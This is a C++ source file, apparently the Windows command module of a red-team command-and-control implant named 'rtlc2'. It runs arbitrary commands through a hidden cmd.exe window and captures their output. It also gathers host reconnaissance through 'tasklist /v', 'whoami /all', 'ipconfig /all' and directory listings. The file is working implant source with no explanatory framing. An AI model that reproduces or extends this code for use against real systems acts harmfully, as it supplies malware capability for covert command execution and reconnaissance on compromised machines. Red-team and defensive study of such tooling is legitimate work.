#ifdef RTLC2_WINDOWS

#include "agent.h"
#include <windows.h>
#include <string>
#include <vector>

namespace rtlc2 {
namespace modules {

std::string ExecuteShell(const std::string& command) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "Error: CreatePipe failed";
    }

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;

    std::string cmd = "cmd.exe /c " + command;

    if (!CreateProcessA(NULL, const_cast<char*>(cmd.c_str()),
                        NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return "Error: CreateProcess failed";
    }

    CloseHandle(hWritePipe);

    // Read output
    std::string result;
    char buffer[4096];
    DWORD bytesRead;

    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = 0;
        result += buffer;
    }

    WaitForSingleObject(pi.hProcess, 5000);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    return result;
}

std::string GetProcessList() {
    return ExecuteShell("tasklist /v");
}

std::string ListDirectory(const std::string& path) {
    return ExecuteShell("dir /a \"" + path + "\"");
}

std::string GetCurrentDir() {
    char buf[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, buf);
    return std::string(buf);
}

bool ChangeDir(const std::string& path) {
    return SetCurrentDirectoryA(path.c_str()) != 0;
}

std::string GetWhoami() {
    return ExecuteShell("whoami /all");
}

std::string GetIPConfig() {
    return ExecuteShell("ipconfig /all");
}

} // namespace modules
} // namespace rtlc2

#endif // RTLC2_WINDOWS
